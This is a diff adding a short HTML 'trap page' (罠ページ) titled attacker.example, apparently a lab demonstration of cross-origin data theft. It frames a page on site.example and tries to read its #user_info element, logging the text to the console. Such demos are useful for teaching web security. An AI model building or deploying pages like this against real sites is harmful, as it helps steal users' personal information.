@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>attacker.example</title>
+</head>
+<script>
+    function load() {
+        const userInfo = frm.document.querySelector("#user_info")
+        console.log(userInfo.textContent);
+    }
+</script>
+<body>
+    <div>
+        罠ページ
+    </div>
+    <iframe src="http://site.example:3000/user.html" name="frm" onload="load()" width="80%"></iframe>
+</body>
+</html>
